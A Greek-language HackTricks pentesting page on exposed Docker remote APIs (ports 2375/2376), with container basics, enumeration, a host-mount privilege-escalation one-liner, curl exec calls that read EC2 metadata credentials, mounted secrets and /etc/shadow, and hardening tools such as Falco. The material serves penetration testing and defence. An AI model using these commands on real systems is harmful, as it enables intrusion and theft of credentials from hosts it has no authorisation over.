# 2375, 2376 Ελέγχος Ευπάθειας Docker

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης των HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στα HackTricks** ή να **κατεβάσετε τα HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι μια μηχανή αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει **δωρεάν** λειτουργίες για να ελέγξετε αν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλου λογισμικού**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των αναλήψεων λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κλοπή πληροφοριών.

Μπορείτε να ελέγξετε τον ιστότοπό τους και να δοκιμάσετε τη μηχανή τους δωρεάν στο:

{% embed url="https://whiteintel.io" %}

---

### Βασικά του Docker

#### Τι είναι

Το Docker είναι η **πρωτοποριακή πλατφόρμα** στη βιομηχανία της **containerization**, πρωτοστατώντας στη **συνεχή καινοτομία**. Διευκολύνει την απλή δημιουργία και διανομή εφαρμογών, καλύπτοντας από τις **παραδοσιακές έως τις μελλοντικές**, και εξασφαλίζει τη **ασφαλή ανάπτυξή** τους σε διαφορετικά περιβάλλοντα.

#### Βασική αρχιτεκτονική του Docker

* [**containerd**](http://containerd.io): Αυτό είναι ένας **πυρήνας εκτέλεσης** για τα containers, υπεύθυνος για την ολοκληρωμένη **διαχείριση του κύκλου ζωής ενός container**. Αυτό περιλαμβάνει τη χειρισμό **μεταφοράς και αποθήκευσης εικόνων**, καθώς και την επίβλεψη της **εκτέλεσης, παρακολούθησης και δικτύωσης** των containers. **Περισσότερες λεπτομέρειες** για το containerd **εξετάζονται περαιτέρω**.
* Το **container-shim** διαδραματίζει κρίσιμο ρόλο ως **μεσολαβητής** στη χειρισμό **ανενεργών containers**, παίρνοντας απαλά τη θέση από το **runc** μετά την αρχικοποίηση των containers.
* [**runc**](http://runc.io): Εκτιμάται για τις δυνατότητές του ως **ελαφρύς και καθολικός χρόνος εκτέλεσης container**, το runc είναι συμβατό με το **OCI πρότυπο**. Χρησιμοποιείται από το containerd για να **ξεκινήσει και να διαχειριστεί τα containers** σύμφωνα με τις **οδηγίες του OCI**, έχοντας εξελιχθεί από το αρχικό **libcontainer**.
* [**grpc**](http://www.grpc.io) είναι ουσιώδες για τη **διευκόλυνση της επικοινωνίας** μεταξύ του containerd και της **μηχανής docker**, εξασφαλίζοντας **αποτελεσματική αλληλεπίδραση**.
* Το [**OCI**](https://www.opencontainers.org) είναι κρίσιμο για τη διατήρηση των **προδιαγραφών OCI** για το χρόνο εκτέλεσης και τις εικόνες, με τις πιο πρόσφατες εκδόσεις του Docker να είναι **συμμορφωμένες τόσο με τις προδιαγραφές εικόνων όσο και με τον χρόνο εκτέλεσης** του OCI. 

#### Βασικές εντολές
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** αναπτύχθηκε ειδικά για να εξυπηρετήσει τις ανάγκες πλατφορμών ελαχίστων όπως **Docker και Kubernetes**, μεταξύ άλλων. Στοχεύει στο **απλοποίηση της εκτέλεσης των containers** σε διάφορα λειτουργικά συστήματα, συμπεριλαμβανομένων των Linux, Windows, Solaris, και άλλων, με την αφαίρεση λειτουργιών που είναι ειδικές στο λειτουργικό σύστημα και κλήσεις συστήματος. Ο στόχος του Containerd είναι να περιλαμβάνει μόνο τα απαραίτητα χαρακτηριστικά που απαιτούν οι χρήστες του, προσπαθώντας να παραλείψει τα περιττά στοιχεία. Ωστόσο, η πλήρης επίτευξη αυτού του στόχου αναγνωρίζεται ως πρόκληση.

Μια κύρια σχεδιαστική απόφαση είναι ότι το **Containerd δεν διαχειρίζεται το δίκτυο**. Το δίκτυο θεωρείται κρίσιμο στοιχείο σε κατανεμημένα συστήματα, με πολυπλοκότητες όπως το Λογισμικό Ορισμένου Δικτύου (SDN) και την ανακάλυψη υπηρεσιών που ποικίλλουν σημαντικά από μια πλατφόρμα σε μια άλλη. Επομένως, το Containerd αφήνει τις πτυχές του δικτύου να διαχειρίζονται από τις πλατφόρμες που υποστηρίζει.

Ενώ το **Docker χρησιμοποιεί το Containerd** για την εκτέλεση των containers, είναι σημαντικό να σημειωθεί ότι το Containerd υποστηρίζει μόνο ένα υποσύνολο των λειτουργιών του Docker. Συγκεκριμένα, το Containerd δεν διαθέτει τις δυνατότητες διαχείρισης δικτύου που υπάρχουν στο Docker και δεν υποστηρίζει τη δημιουργία των Docker swarms απευθείας. Αυτή η διάκριση υπογραμμίζει τον εστιασμένο ρόλο του Containerd ως περιβάλλοντος εκτέλεσης container, αναθέτοντας τις πιο εξειδικευμένες λειτουργίες στις πλατφόρμες με τις οποίες ενσωματώνεται.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** είναι ένας μηχανισμός ελαχιστοποίησης πηγαίου κώδικα που προσαρμόζεται στα πρότυπα του [Open Container Initiative (OCI)](https://github.com/opencontainers), αναπτύχθηκε και διατηρείται από τη Red Hat. Ξεχωρίζει από το Docker με αρκετά χαρακτηριστικά, ειδικά με την **αρχιτεκτονική χωρίς daemon** και την υποστήριξη για **rootless containers**, επιτρέποντας στους χρήστες να εκτελούν containers χωρίς δικαιώματα root.

Το Podman σχεδιάστηκε για να είναι συμβατό με το API του Docker, επιτρέποντας τη χρήση εντολών CLI του Docker. Αυτή η συμβατότητα επεκτείνεται στο οικοσύστημά του, το οποίο περιλαμβάνει εργαλεία όπως το **Buildah** για τη δημιουργία εικόνων container και το **Skopeo** για λειτουργίες εικόνας όπως push, pull και inspect. Περισσότερες λεπτομέρειες για αυτά τα εργαλεία μπορούν να βρεθούν στη [σελίδα τους στο GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Κύριες Διαφορές**

* **Αρχιτεκτονική**: Αντίθετα με το μοντέλο πελάτη-εξυπηρετητή του Docker με έναν δαίμονα παρασκηνίου, το Podman λειτουργεί χωρίς δαίμονα. Αυτός ο σχεδιασμός σημαίνει ότι τα containers τρέχουν με τα προνόμια του χρήστη που τα ξεκινά, βελτιώνοντας την ασφάλεια με το να εξαλείφεται η ανάγκη για πρόσβαση root.
* **Ενσωμάτωση systemd**: Το Podman ενσωματώνεται με το **systemd** για τη διαχείριση των containers, επιτρέποντας τη διαχείριση containers μέσω μονάδων systemd. Αυτό αντίθετα με τη χρήση του Docker του systemd κυρίως για τη διαχείριση της διαδικασίας του Docker daemon.
* **Rootless Containers**: Ένα καίριο χαρακτηριστικό του Podman είναι η δυνατότητά του να εκτελεί containers με τα προνόμια του χρήστη που τα εκκινεί. Αυτή η προσέγγιση ελαχιστοποιεί τους κινδύνους που σχετίζονται με παραβιάσεις container εξασφαλίζοντας ότι οι επιτιθέμενοι κερδίζουν μόνο τα προνόμια του χρήστη που έχει παραβιαστεί, όχι πρόσβαση root.

Η προσέγγιση του Podman προσφέρει μια ασφαλή και ευέλικτη εναλλακτική λύση στο Docker, τονίζοντας τη διαχείριση προνομίων χρήστη και τη συμβατότητα με τις υπάρχουσες ροές εργασίας του Docker.
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

### Βασικές Πληροφορίες

Η απομακρυσμένη διεπαφή API λειτουργεί εξ' ορισμού στη θύρα 2375 όταν είναι ενεργοποιημένη. Η υπηρεσία από προεπιλογή δεν απαιτεί ταυτοποίηση επιτρέποντας σε έναν επιτιθέμενο να ξεκινήσει ένα προνομιούχο docker container. Χρησιμοποιώντας την Απομακρυσμένη API, κάποιος μπορεί να συνδέσει τους οικοδεσπότες / (κατάλογο ρίζας) στο container και να διαβάσει/εγγράψει αρχεία του περιβάλλοντος του οικοδεσπότη. 

**Προεπιλεγμένη θύρα:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Απαρίθμηση

#### Χειροκίνητη

Σημείωση ότι για να απαριθμήσετε το API του docker μπορείτε να χρησιμοποιήσετε την εντολή `docker` ή το `curl` όπως στο παρακάτω παράδειγμα:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Εάν μπορείτε **να επικοινωνήσετε με το απομακρυσμένο docker API με την εντολή `docker`** μπορείτε **να εκτελέσετε** οποιαδήποτε από τις **εντολές docker** [**που προηγουμένως** σχολιάστηκαν](2375-pentesting-docker.md#basic-commands) για να αλληλεπιδράσετε με την υπηρεσία.

{% hint style="info" %}
Μπορείτε να `εξάγετε το DOCKER_HOST="tcp://localhost:2375"` και **να αποφύγετε** τη χρήση της παραμέτρου `-H` με την εντολή docker
{% endhint %}

**Γρήγορη ανόδος προνομιακών δικαιωμάτων**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Μερικές φορές θα δείτε το **2376** ενεργό για το σημείο **TLS**. Δεν έχω καταφέρει να συνδεθώ με τον πελάτη docker αλλά είναι δυνατό να γίνει με το curl.
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Εάν θέλετε περισσότερες πληροφορίες σχετικά με αυτό, υπάρχουν περισσότερες πληροφορίες εκεί που αντέγραψα τις εντολές από: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Αυτόματο
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Θέτοντας σε κίνδυνο

Στην ακόλουθη σελίδα μπορείτε να βρείτε τρόπους για **δραπέτευση από έναν docker container**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Χρησιμοποιώντας αυτό, είναι δυνατόν να δραπετεύσετε από ένα container, να εκτελέσετε ένα αδύναμο container στον απομακρυσμένο υπολογιστή, να δραπετεύσετε από αυτόν και να θέσετε σε κίνδυνο τον υπολογιστή:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Ανόδος Προνομίων

Αν βρίσκεστε μέσα σε έναν κεντρικό υπολογιστή που χρησιμοποιεί το Docker, μπορείτε [**να διαβάσετε αυτές τις πληροφορίες για να προσπαθήσετε να αναβαθμίσετε τα προνόμια**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Ανακάλυψη μυστικών σε ενεργά Docker containers
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Ελέγξτε το **env** (τμήμα μεταβλητών περιβάλλοντος) για μυστικά και ενδέχεται να βρείτε:

* Κωδικούς πρόσβασης.
* Διευθύνσεις IP.
* Θύρες.
* Διαδρομές.
* Άλλα... .

Εάν θέλετε να εξάγετε ένα αρχείο:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Ασφάλεια του Docker σας

#### Ασφάλεια της εγκατάστασης και χρήσης του Docker

* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) για να ελέγξετε την τρέχουσα εγκατάσταση του Docker σας.
* `./docker-bench-security.sh`
* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/kost/dockscan](https://github.com/kost/dockscan) για να ελέγξετε την τρέχουσα εγκατάσταση του Docker σας.
* `dockscan -v unix:///var/run/docker.sock`
* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) για να δείτε τα προνόμια που θα έχει ένας container όταν τρέχει με διαφορετικές επιλογές ασφαλείας. Αυτό είναι χρήσιμο για να γνωρίζετε τις επιπτώσεις της χρήσης ορισμένων επιλογών ασφαλείας για την εκτέλεση ενός container:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Ασφάλεια των Docker Images

* Μπορείτε να χρησιμοποιήσετε ένα docker image του [https://github.com/quay/clair](https://github.com/quay/clair) για να σαρώσετε τις άλλες docker εικόνες σας και να βρείτε ευπάθειες.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Ασφάλεια των Dockerfiles

* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) για **να ελέγξετε το Dockerfile** σας και να βρείτε όλους τους τύπους λανθασμένων ρυθμίσεων. Κάθε λανθασμένη ρύθμιση θα δοθεί ένα αναγνωριστικό, μπορείτε να βρείτε εδώ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) πώς να διορθώσετε κάθε μία από αυτές.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (173).png>)

* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) για **να ελέγξετε το Dockerfile** σας και να βρείτε όλους τους τύπους λανθασμένων ρυθμίσεων.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (209).png>)

* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) για **να ελέγξετε το Dockerfile** σας και να βρείτε όλους τους τύπους λανθασμένων ρυθμίσεων.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (68).png>)

* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) για **να ελέγξετε το Dockerfile** σας και να βρείτε όλους τους τύπους λανθασμένων ρυθμίσεων.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (498).png>)

#### Καταγραφή Υπούλων Δραστηριοτήτων

* Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) για να ανιχνεύσετε **υπούλες συμπεριφορές σε εκτελούμενα containers**.
* Σημειώστε στο ακόλουθο τμήμα πώς **ο Falco συντάσσει ένα πυρήνα module και τον εισάγει**. Έπειτα, φορτώνει τους κανόνες και **ξεκινά την καταγραφή ύποπτων δραστηριοτήτων**. Σε αυτήν την περίπτωση, έχει ανιχνευθεί ότι ξεκίνησαν 2 προνομιούχα containers, ένας εξ' αυτών με ευαίσθητο mount, και μετά από λίγα δευτερόλεπτα ανιχνεύθηκε πώς άνοιξε ένα κέλυφος μέσα σε έναν από τους containers.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Παρακολούθηση Docker

Μπορείτε να χρησιμοποιήσετε το auditd για την παρακολούθηση του docker.

### Αναφορές

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι μια μηχανή αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει δωρεάν λειτουργίες για να ελέγξετε αν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλων λογισμικών**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των απαγωγών λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κακόβουλα λογισμικά που κλέβουν πληροφορίες.

Μπορείτε να ελέγξετε τον ιστότοπό τους και να δοκιμάσετε τη μηχανή τους δωρεάν στο:

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
